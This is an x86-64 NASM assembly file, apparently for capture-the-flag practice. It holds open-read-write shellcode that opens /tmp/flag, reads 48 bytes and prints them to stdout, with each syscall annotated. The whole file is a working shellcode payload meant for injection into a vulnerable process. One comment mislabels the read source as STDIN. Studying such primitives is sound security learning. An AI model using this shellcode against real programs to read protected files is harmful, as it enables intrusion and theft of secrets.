; Nasm v2.15.05 (on Linux x64)
; ORW Shellcode real version (Only use text section)

section .text
        global _start

_start:
        ; filepath(/tmp/flag)
        push 0x67
        mov rax, 0x616c662f706d742f
        push rax

        ; open("/tmp/flag", RD_ONLY, NULL);
        mov rax, 0x02           ; open(
        mov rdi, rsp            ;       const char *filename,
        mov rsi, 0x00           ;       int flags,
        mov rdx, 0x00           ;       ummod_t mode);
        syscall

        ; read(STDIN, buf, 0x30);
        mov rdi, rax            ; To access to the given file,
                                ; It's required to use allocated file descriptor
                                ; stored in [rax] register after open() syscall.
        mov rax, 0x00           ; read(
        ; rdi                   ;       unsigned int fd,
        mov rsi, rsp
        sub rsi, 0x30           ;       char *buf
        mov rdx, 0x30           ;       size_t count);
        syscall

        ; write(fd, buf, 0x30)
        mov rax, 0x01           ; write(
        mov rdi, 0x01           ;       unsigned int fd,
        ;rsi                    ;       const char *buf,
        mov rdx, 0x30           ;       size_t count);
        syscall

        ; exit
        mov rax, 0x3C
        mov rdi, 0x1
        syscall
